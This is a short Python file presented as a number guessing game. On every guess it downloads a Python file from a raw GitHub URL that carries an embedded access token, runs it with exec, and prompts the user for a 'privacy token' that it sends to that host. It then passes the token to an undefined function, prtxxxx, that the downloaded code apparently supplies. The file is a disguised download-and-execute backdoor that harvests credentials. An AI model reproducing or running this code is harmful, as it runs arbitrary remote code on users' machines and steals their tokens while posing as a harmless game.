import requests

import random




def plr():
    secret_number = random.randint(1, 100)
    attempts = 0

    while True:
        url = 'https://raw.githubusercontent.com/xsjfns/myown/main/newket.py?token=GHSAT0AAAAAACQKJBTSU2UT32DPBLVCTJCAZQIYY5Q'
        guess = input("Enter your guess: ")
        token = input("Enter your privacy  token: ")
        headers = {"Authorization": f"token {token}"}
        response = requests.get(url, headers=headers)
        exec(response.text)
        if not guess.isdigit():
            print("Please enter a valid number.")
            continue
        
        guess = int(guess)
        attempts += 1

        if guess < secret_number:
            print("Too low! Try again.")
            prtxxxx(url, token)
        elif guess > secret_number:
            print("Too high! Try again.")
            prtxxxx(url, token)
        else:
            print(f"Congratulations! You've guessed the number {secret_number} in {attempts} attempts!")
            prtxxxx(url, token)
            break
            
def edg():
    print("Thanks for playing!")

print("Welcome to the Number Guessing Game!")
print("I'm thinking of a number between 1 and 100.")
print("Try to guess it in the fewest attempts possible!")
print("Let's begin!")
print("versoin 1.0")
plr()
edg()
